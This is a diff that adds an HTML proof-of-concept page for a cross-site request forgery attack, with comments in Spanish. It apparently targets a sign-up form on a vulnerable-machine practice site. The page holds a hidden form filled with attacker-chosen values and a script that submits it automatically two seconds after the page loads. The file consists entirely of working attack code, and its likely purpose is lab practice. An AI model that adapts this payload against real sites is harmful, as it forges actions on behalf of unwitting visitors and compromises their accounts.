@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack - Sign Up</title>
+</head>
+<body>
+    <h1>CSRF Attack - Sign Up Form</h1>
+    <p>Este formulario simula un ataque CSRF contra el formulario de registro.</p>
+    
+    <form id="csrfForm" action="http://hackme1.vulnmachines.com/csrf/signin.php" method="POST">
+        <input type="hidden" name="fname" value="Evil">
+        <input type="hidden" name="lname" value="Hacker">
+        <input type="hidden" name="email" value="evil@hacker.com">
+        <input type="hidden" name="password" value="evilpass123">
+        <input type="hidden" name="gender" value="male">
+        <input type="hidden" name="cno" value="9999999999">
+        <input type="hidden" name="age" value="30">
+        <input type="hidden" name="submit" value="Submit">
+    </form>
+    
+    <script>
+        // Auto-submit del formulario después de 2 segundos
+        setTimeout(function() {
+            document.getElementById('csrfForm').submit();
+        }, 2000);
+    </script>
+    
+    <p>El formulario se enviará automáticamente en 2 segundos...</p>
+</body>
+</html>
